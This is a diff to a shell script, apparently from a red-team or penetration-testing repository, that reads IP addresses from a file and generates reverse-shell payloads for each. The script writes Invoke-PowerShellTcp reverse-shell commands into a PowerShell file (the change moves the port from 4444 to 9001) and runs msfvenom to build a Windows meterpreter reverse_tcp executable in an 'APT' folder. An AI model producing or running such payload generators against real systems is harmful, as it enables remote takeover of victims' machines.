@@ -21,7 +21,7 @@ cp template.txt reverseshell.ps1
 
 while read line
   do 
-  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 4444" >> ./reverseshell.ps1
+  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> ./reverseshell.ps1
   mv reverseshell.ps1 ./APT/reverseshell.ps1
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=4444 --platform windows -f exe -o ./APT/meterpreter.exe
 done < $filename
